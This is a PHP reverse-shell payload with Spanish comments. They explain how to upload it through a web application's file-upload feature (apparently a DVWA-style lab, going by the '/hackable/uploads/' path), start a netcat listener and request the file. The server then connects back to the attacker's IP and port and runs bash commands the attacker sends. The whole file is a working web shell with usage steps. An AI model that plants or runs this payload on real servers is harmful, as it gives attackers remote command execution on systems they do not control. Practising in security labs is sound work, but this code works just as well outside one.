<?php
/*
    Este archivo debe ser subido en el servidor, usando file upload.
    Despues se debe acceder al path donde se guarda este archivo para que sea ejecutado.
    .../hackable/uploads/reverse_shell.php
    Se debe crear un listener con nc o otro comando a elección en el puerto correspondiente.
    al ingresar al path del reverse_shell script en el server, el servidor se conectara con el servidor
    atacado para ejecutar comandos.
*/
$ip = '192.168.100.47'; // Cambia esto por tu IP
$port = 6969; // Cambia esto por el puerto que elijas

// Inicia una conexión de socket
$sock = fsockopen($ip, $port);
$proc = proc_open('bash', [
    0 => ['pipe', 'r'], // stdin
    1 => ['pipe', 'w'], // stdout
    2 => ['pipe', 'w'], // stderr
], $pipes);

if (is_resource($proc)) {
    // Envía y recibe datos a través del socket
    while ($line = fgets($sock)) {
        fwrite($pipes[0], $line);
        fwrite($sock, fread($pipes[1], 4096));
    }
    fclose($sock);
}
?>


